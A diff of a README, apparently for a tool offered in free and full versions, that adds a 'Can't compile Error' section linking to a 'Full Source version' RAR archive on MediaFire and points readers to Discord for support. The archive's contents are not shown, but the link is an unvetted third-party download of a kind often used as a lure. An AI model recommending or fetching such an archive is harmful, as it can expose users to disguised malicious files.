@@ -4,8 +4,11 @@
 
 * ` FOLLOW THE VIDEOS , I UPLOADED BELOW `
 
-* ` IF FREE VERSION NOT WORKING , JOIN DISCORD FOR SUPPORT 
+* ` IF FREE VERSION NOT WORKING , JOIN DISCORD FOR SUPPORT `
 
+### Can't compile Error ❓
+
+### - ・  Full Source version : [Source](https://www.mediafire.com/file/7gna0x1xg7ucbl1/dd.rar/file)
 
 ***
 
